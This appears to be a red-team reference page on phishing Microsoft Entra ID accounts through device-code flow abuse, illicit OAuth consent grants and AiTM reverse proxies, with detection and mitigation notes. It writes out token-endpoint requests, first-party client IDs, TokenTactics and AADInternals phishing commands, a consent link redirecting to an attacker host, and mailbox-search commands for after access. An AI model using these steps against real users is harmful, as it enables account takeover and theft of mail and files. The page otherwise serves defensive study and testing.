---
title: Device code phishing & OAuth consent abuse
category: AD / Entra ID
order: 50
tags:
  - entra
  - m365
  - device-code
  - phishing
  - oauth
  - consent-grant
  - aitm
  - tokentactics
  - storm-2372
  - initial-access
summary: "Three phishing techniques that end with the attacker holding valid tokens or a live session for a cloud identity, all of which survive password-based MFA: abusing the OAuth 2.0 device authorization grant, tricking a user into consenting to a rogue OAuth app (illicit consent grant), and reverse-proxying the real login to steal the post-MFA session cookie (AiTM)."
prerequisites:
  - Target user email(s) ($target_user) and a credible lure
  - "Device code: ability to relay the user code to the victim within its ~15-minute validity; a first-party public client ID (no app registration required)"
  - "Consent grant: a multi-tenant app registration (or a tenant that still allows end-user consent to apps)"
tools:
  - TokenTacticsV2
  - AADInternals
  - GraphRunner
  - 365-Stealer
  - o365-attack-toolkit
  - PwnAuth
  - Evilginx
detection:
  - Sign-in logs where authentication protocol = Device Code, especially from unusual IP / geo / user (Microsoft tracks this as Storm-2372)
  - "Consent grant: audit events 'Consent to application' / 'Add app role assignment grant to user'; apps with risky delegated scopes or unfamiliar reply URLs"
  - "AiTM: impossible travel, token replay, unfamiliar sign-in properties, and session-cookie reuse from a new device"
mitigation:
  - Conditional Access policy blocking the device code flow except for the specific users / networks that need it (authentication-flows control)
  - Require phishing-resistant MFA (FIDO2 / passkeys); block legacy authentication
  - Restrict end-user consent to apps (admin consent workflow, verified publishers); enable token protection and CAE
refs:
  - label: AADInternals - device code phishing technique (Nestori Syynimaa)
    url: https://aadinternals.com/post/phishing/
  - label: TokenTacticsV2 (f-bader)
    url: https://github.com/f-bader/TokenTacticsV2
  - label: GraphRunner (dafthack)
    url: https://github.com/dafthack/GraphRunner
  - label: Microsoft - detect & remediate illicit consent grants
    url: https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants
  - label: "Cloud-Architekt - AzureAD Attack & Defense: Consent Grant"
    url: https://github.com/Cloud-Architekt/AzureAD-Attack-Defense/blob/main/ConsentGrant.md
  - label: dirkjanm.io - phishing for Entra PRTs (AiTM/device code)
    url: https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/
  - label: Blocking device code flow abuse (Storm-2372)
    url: https://jeffreyappel.nl/how-to-protect-against-device-code-flow-abuse-storm-2372-attacks-and-block-the-authentication-flow/
---

## What it is

Three phishing techniques that end with the attacker holding valid session/tokens for a cloud identity, and that all survive password-based MFA:

1. **Device-code phishing** - abuse the OAuth 2.0 device authorization grant.
2. **Illicit consent grant** - trick the user into consenting to a rogue OAuth app.
3. **AiTM** - reverse-proxy the real login to capture the post-MFA session cookie.

## Device code flow

The device-code grant is meant for input-constrained devices. The attacker starts it, gets a short user code, and phishes the victim into entering **that code** on the genuine Microsoft page:

```sh
# 1) Attacker requests a device code for a public first-party client
POST https://login.microsoftonline.com/$tenant/oauth2/v2.0/devicecode
  client_id=<first-party app>&scope=https://graph.microsoft.com/.default
# -> user_code, device_code, verification_uri = https://microsoft.com/devicelogin (valid ~15 min)

# 2) Victim is lured to microsoft.com/devicelogin, enters user_code, signs in + clears MFA

# 3) Attacker polls the token endpoint until the victim finishes
POST https://login.microsoftonline.com/$tenant/oauth2/v2.0/token
  grant_type=urn:ietf:params:oauth:grant-type:device_code
  &client_id=<first-party app>&device_code=<device_code>
# -> access_token + refresh_token, issued to the attacker
```

Common public client IDs (no app registration needed): Microsoft Office `d3590ed6-52b3-4102-aeff-aad2292ab01c`, Azure CLI `04b07795-8ddb-461a-bbee-02f9e1bf7b46`, Microsoft Authentication Broker `29d9ed98-a469-4536-ade2-f981bc1d605e`.

```powershell
# TokenTacticsV2 automates the request + polling
$t = Get-EntraIDTokenFromDeviceCode -Client MSGraph

# AADInternals equivalent (Nestori Syynimaa's original technique)
Invoke-AADIntPhishing -Recipients $target_user -Subject "..." -Sender "..."
```

**Why it beats MFA:** the victim authenticates and completes MFA on the *real* login.microsoftonline.com - no lookalike domain, no third-party consent - and the resulting tokens land with the attacker.

## Illicit consent grant (OAuth app phishing)

Register a multi-tenant app requesting delegated Graph scopes (`Mail.Read`, `Files.Read.All`, `offline_access`...), send the victim a normal `/authorize` consent link, and on approval receive a refresh token for the granted scopes. Password reset and MFA do **not** revoke it - only removing the consent / service principal does.

```sh
# The lure is a genuine Microsoft consent URL
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<rogue app>
  &response_type=code&redirect_uri=<attacker>
  &scope=offline_access%20Mail.Read%20Files.Read.All
```

Tooling: **365-Stealer**, **o365-attack-toolkit**, **PwnAuth**. GraphRunner's `Invoke-InjectOAuthApp` plants such an app for persistence.

## AiTM (reference level)

A reverse-proxy phishing kit (e.g. **Evilginx**) relays the victim's traffic to the real IdP: credentials and the MFA challenge pass through to Microsoft, and the kit captures the **session cookie** issued after MFA, which is replayed to ride the authenticated session. Defeats password-based MFA; defeated in turn by phishing-resistant (FIDO2) MFA and token protection.

## Post-access

Replay captured tokens into GraphRunner (`Get-Inbox`, `Invoke-SearchMailbox`, `Invoke-SearchSharePointAndOneDrive`, `Invoke-DumpApps`) or the Graph directly. See the **token abuse** page for pivoting refresh tokens across resources and clients.
